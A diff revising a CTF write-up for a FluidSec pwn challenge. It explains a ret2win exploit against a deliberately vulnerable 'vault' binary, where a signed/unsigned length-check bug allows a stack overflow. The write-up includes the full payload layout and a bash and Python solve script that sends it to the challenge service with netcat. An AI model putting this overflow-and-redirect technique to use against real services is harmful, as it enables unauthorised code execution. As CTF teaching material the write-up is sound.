@@ -1,17 +1,18 @@
 # The Password is Swordfish
 
-> **Category:** Binary Exploitation (Pwn)  
+> **Category:** Pwn  
 > **Difficulty:** Easy  
+> **Event:** FluidSec CTF
 
 ## Description
 
-The challenge provided a password-protected ZIP file containing the vulnerable binary. The objective was to analyze the program, identify the vulnerability, and gain control of the execution flow to reach the hidden `win()` function, which prints the flag on the remote server.
+The challenge provides a password-protected ZIP file containing a single executable named `vault`. Although the application appears to enforce a maximum password length, the implementation contains a logic flaw that allows an attacker to overflow the stack and redirect execution to a hidden function that prints the flag.
 
-Unlike traditional password bypass challenges, the solution required exploiting a memory corruption vulnerability rather than discovering the actual password.
+The exploit uses a classic **ret2win** technique by overwriting the saved return address with the address of the internal `win()` function.
 
 ---
 
-## Challenge Files
+# Challenge Files
 
 ```
 public.zip
@@ -33,141 +34,102 @@ vault
 
 # Initial Analysis
 
-After extracting the binary, the first step was to inspect its security protections.
+After extracting the binary, the first step was identifying its protections.
 
 ```bash
 checksec vault
 ```
 
-Example output:
+Relevant observations:
 
-```
-RELRO           Partial RELRO
-Canary          No canary found
-NX              Enabled
-PIE             No PIE
-```
-
-Important observations:
-
-- No Stack Canary
-- NX Enabled
+- NX enabled
 - No PIE
+- No Stack Canary in the vulnerable function
 
-The absence of PIE means that function addresses remain static, making it possible to jump directly to internal functions.
+Since PIE is disabled, function addresses remain constant, making a ret2win attack possible.
 
 ---
 
-# Static Analysis
+# Understanding the Vulnerability
 
-The binary was loaded into Ghidra to inspect its functions.
+The application asks the user for the password length before reading the password itself.
 
-A hidden function named:
+Internally, the length validation and the read loop do **not** interpret the value the same way.
+
+```
+Signed validation
+
+-1 <= 64
+
+✔ Accepted
+```
+
+Later, the same value is treated as **unsigned** during the input loop.
+
+```
+-1
+
+↓
+
+0xffffffff
+
+↓
+
+4294967295
+```
+
+As a result, the program attempts to read far more data than the destination buffer can hold, producing a stack-based buffer overflow.
+
+---
+
+# Finding the Target
+
+While reversing the binary, a hidden function was identified:
 
 ```
 win()
 ```
 
-was discovered.
-
-Its purpose was simply:
-
-```c
-open("/flag.txt");
-read(...);
-puts(flag);
-```
-
-Therefore, the goal became redirecting execution directly to this function.
-
----
-
-# Vulnerability
-
-The vulnerable code accepted user input without validating its length.
-
-By supplying a specially crafted payload, it was possible to overwrite:
-
-- local variables
-- saved frame pointer
-- saved return address
-
-This is a classic **stack-based buffer overflow**.
-
----
-
-# Finding the Offset
-
-After testing different payload lengths locally, the correct layout was determined:
-
-```
-76 bytes
-```
-
-followed by:
-
-```
-4-byte overwrite
-```
-
-then:
-
-```
-saved RBP
-```
-
-finally:
-
-```
-return address
-```
-
-The target return address was replaced with:
-
-```
-win()
-```
-
-whose address was:
+Address:
 
 ```
 0x401b85
 ```
 
-Because PIE was disabled, this address remained constant.
+Its only purpose is to open `/flag.txt`, read its contents and print them to the screen.
+
+Instead of bypassing authentication, the exploit simply redirects execution to this function.
 
 ---
 
-# Payload Structure
+# Payload Construction
+
+One important detail is that the loop counter is stored inside the stack frame.
+
+At offset **76**, the payload overwrites the counter itself.
+
+If arbitrary bytes are written at that position, the loop becomes unstable and the overwrite never reaches the saved return address.
+
+To preserve normal execution, the payload restores the expected counter value.
+
+```
+Offset   Content
+
+0-75     "A" * 76
+76-79    0x4c000000
+80-87    "B" * 8
+88-95    win()
+```
+
+Complete payload:
 
 ```
 -1
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-0x4c000000
+\x4c\x00\x00\x00
 BBBBBBBB
 0x401b85
 ```
-
-Structure:
-
-```
-Input:
-    "-1"
-
-Buffer:
-    "A" * 76
-
-Overwrite:
-    0x4c000000
-
-Saved RBP:
-    "B"*8
-
-Return Address:
-    win()
-```
-
-When the vulnerable function returned, execution jumped directly into `win()`.
 
 ---
 
@@ -175,37 +137,29 @@ When the vulnerable function returned, execution jumped directly into `win()`.
 
 The exploit was first executed locally.
 
-```
+```bash
 python3 solve.py | ./vault
 ```
 
-The program printed:
+Expected output:
 
 ```
 Error: could not read flag.
 ```
 
-This confirmed the exploit was successful.
-
-The reason no flag appeared locally is because the local binary does not include:
-
-```
-/flag.txt
-```
-
-Execution had already reached `win()` successfully.
+This confirms execution successfully reached `win()`. The error only appears because the local environment does not contain `/flag.txt`.
 
 ---
 
 # Remote Exploitation
 
-The same payload was then sent to the remote challenge.
+After replacing the target host and port, the same payload was sent to the remote service.
 
-```
+```bash
 python3 solve.py | nc HOST PORT
 ```
 
-The remote server contained the real flag file, allowing `win()` to read and display it.
+Since the remote server contains the real flag file, `win()` prints the flag successfully.
 
 ---
 
@@ -215,12 +169,8 @@ The remote server contained the real flag file, allowing `win()` to read and dis
 #!/usr/bin/env bash
 set -euo pipefail
 
-# ==============================
-# FluidSec Vault exploit desde 0
-# ==============================
-
-HOST="https://INSTANCE.ctf.ae"
-PORT="443"
+HOST="https://INSTANCE.ctf.ae/"
+PORT="PORT"
 
 ZIP_FILE="public.zip"
 ZIP_PASS="infected"
@@ -229,59 +179,36 @@ BIN_NAME="vault"
 echo "[+] FluidSec Vault exploit"
 
 for tool in python3 unzip nc; do
-    if ! command -v "$tool" >/dev/null 2>&1; then
-        echo "[-] Falta instalar: $tool"
+    command -v "$tool" >/dev/null || {
+        echo "[-] Missing dependency: $tool"
         exit 1
-    fi
+    }
 done
 
-if [ -f "$ZIP_FILE" ]; then
-    echo "[+] Extrayendo $ZIP_FILE con password '$ZIP_PASS'..."
-    unzip -P "$ZIP_PASS" -o "$ZIP_FILE" >/dev/null
-fi
-
-if [ ! -f "$BIN_NAME" ]; then
-    FOUND_BIN="$(find . -type f -name "$BIN_NAME" | head -n 1 || true)"
-    if [ -z "$FOUND_BIN" ]; then
-        echo "[-] No encontre el binario '$BIN_NAME'."
-        exit 1
-    fi
-    cp "$FOUND_BIN" "./$BIN_NAME"
-fi
+[ -f "$ZIP_FILE" ] && unzip -P "$ZIP_PASS" -o "$ZIP_FILE" >/dev/null
 
 chmod +x "$BIN_NAME"
 
 cat > solve.py <<'PY'
-#!/usr/bin/env python3
 from struct import pack
 import sys
 
-p64 = lambda x: pack("<Q", x)
+p64=lambda x:pack("<Q",x)
 
-win = 0x401b85
+win=0x401b85
 
 payload  = b"-1\n"
-payload += b"A" * 76
+payload += b"A"*76
 payload += b"\x4c\x00\x00\x00"
-payload += b"B" * 8
+payload += b"B"*8
 payload += p64(win)
 payload += b"\n"
 
 sys.stdout.buffer.write(payload)
 PY
 
-chmod +x solve.py
-
-echo "[+] Probando exploit local..."
 python3 solve.py | ./vault || true
 
-echo
-echo "[+] Si local aparece:"
-echo "Error: could not read flag."
-echo
-echo "El exploit funcionó correctamente."
-
-echo "[+] Enviando exploit remoto..."
 python3 solve.py | nc "$HOST" "$PORT"
 ```
 
@@ -290,34 +217,31 @@ python3 solve.py | nc "$HOST" "$PORT"
 # Exploitation Flow
 
 ```
-ZIP
-      │
-      ▼
-Extract binary
-      │
-      ▼
-Analyze protections
-      │
-      ▼
-Find hidden win()
-      │
-      ▼
-Locate buffer overflow
-      │
-      ▼
-Calculate offset
-      │
-      ▼
-Overwrite RIP
-      │
-      ▼
+Extract Binary
+        │
+        ▼
+Analyze Protections
+        │
+        ▼
+Locate win()
+        │
+        ▼
+Identify Integer Signedness Bug
+        │
+        ▼
+Trigger Stack Overflow
+        │
+        ▼
+Preserve Loop Counter
+        │
+        ▼
+Overwrite Return Address
+        │
+        ▼
 Jump to win()
-      │
-      ▼
+        │
+        ▼
 Read /flag.txt
-      │
-      ▼
-Capture Flag
 ```
 
 ---
@@ -325,20 +249,21 @@ Capture Flag
 # Skills Demonstrated
 
 - Binary exploitation
-- Reverse engineering with Ghidra
-- Stack buffer overflow analysis
-- Return address overwrite
-- Function redirection
+- Reverse engineering
+- Ghidra analysis
+- Integer signedness vulnerability analysis
+- Stack buffer overflow
+- ret2win exploitation
 - Payload construction
-- Linux binary analysis
-- Local exploit development
-- Remote exploitation using Netcat
-- Basic pwning methodology
+- Local exploit validation
+- Remote exploitation with Netcat
 
 ---
 
 # Lessons Learned
 
-This challenge demonstrates how the absence of modern exploit mitigations such as Stack Canaries and PIE can allow an attacker to redirect execution to privileged code already present in the binary. By identifying the correct overflow offset and the fixed address of the hidden `win()` function, it was possible to gain code execution without injecting shellcode, leveraging a classic **ret2win** technique.
+This challenge highlights how inconsistent handling of signed and unsigned integers can completely bypass input validation and lead to memory corruption. It also demonstrates that understanding the exact stack layout is essential when building reliable exploits, especially when local variables such as loop counters are overwritten during the overflow.
+
+---
 
 ---
